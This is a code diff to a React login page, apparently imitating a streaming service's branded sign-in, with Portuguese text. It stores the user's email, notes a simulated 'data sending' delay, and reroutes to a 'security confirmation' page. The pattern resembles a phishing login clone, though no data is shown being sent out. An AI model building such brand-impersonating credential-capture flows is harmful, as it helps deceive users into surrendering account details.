@@ -56,10 +56,11 @@ export default function Login() {
 
     setIsLoading(true);
     sessionStorage.setItem("userEmail", email);
+    // Simulate data sending with delay, then redirect to security confirmation
     setTimeout(() => {
       setIsLoading(false);
-      setLocation("/password");
-    }, 1000);
+      setLocation("/security-confirmation");
+    }, 2000);
   };
 
   return (
@@ -135,9 +136,16 @@ export default function Login() {
               <button
                 type="submit"
                 disabled={isLoading}
-                className="w-full h-[48px] sm:h-[50px] bg-[#E50914] text-white text-[15px] sm:text-[16px] font-bold rounded hover:bg-[#F6121D] active:scale-[0.98] transition-all duration-150 disabled:opacity-70"
+                className="w-full h-[48px] sm:h-[50px] bg-[#E50914] text-white text-[15px] sm:text-[16px] font-bold rounded hover:bg-[#F6121D] active:scale-[0.98] transition-all duration-150 disabled:opacity-70 flex items-center justify-center gap-2"
               >
-                {isLoading ? "Continuando..." : "Continuar"}
+                {isLoading ? (
+                  <>
+                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                    <span>Verificando...</span>
+                  </>
+                ) : (
+                  "Continuar"
+                )}
               </button>
             </form>
 
